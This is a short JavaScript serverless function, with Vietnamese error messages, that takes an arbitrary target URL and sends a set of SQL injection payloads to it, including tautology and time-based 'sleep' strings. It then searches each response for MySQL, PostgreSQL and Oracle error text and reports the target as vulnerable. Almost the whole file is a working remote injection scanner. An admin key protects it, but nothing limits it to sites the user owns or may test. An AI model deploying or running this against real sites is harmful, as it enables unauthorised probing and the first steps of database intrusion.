import axios from "axios";
import { ADMIN_KEY, getHost } from "./_utils.js";

const PAYLOADS = [
  "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "';", "\";", "' OR sleep(4)--"
];
const INDICATORS = ["you have an error in your sql syntax", "warning: mysql", "sql syntax", "pg_fetch", "ora-"];

export const handler = async (event) => {
  const q = event.queryStringParameters || {};
  const target = q.u || "";
  const key = q.k || event.headers["x-api-key"];
  if (!key || key !== ADMIN_KEY) return { statusCode: 401, body: JSON.stringify({ error: "Sai key" }) };
  if (!target) return { statusCode: 400, body: JSON.stringify({ error: "Thiếu URL" }) };

  const host = getHost(target);
  if (!host) return { statusCode: 400, body: JSON.stringify({ error: "URL không hợp lệ" }) };

  const results = [];
  for (const p of PAYLOADS) {
    const url = target.includes("?") ? `${target}&q=${encodeURIComponent(p)}` : `${target}?q=${encodeURIComponent(p)}`;
    try {
      const res = await axios.get(url, { timeout: 7000 });
      const body = res.data.toString().toLowerCase();
      const found = INDICATORS.find(i => body.includes(i));
      results.push({ payload: p, vulnerable: !!found, indicator: found || null });
    } catch (e) {
      results.push({ payload: p, error: e.message });
    }
  }

  return { statusCode: 200, body: JSON.stringify({ target, results }) };
};
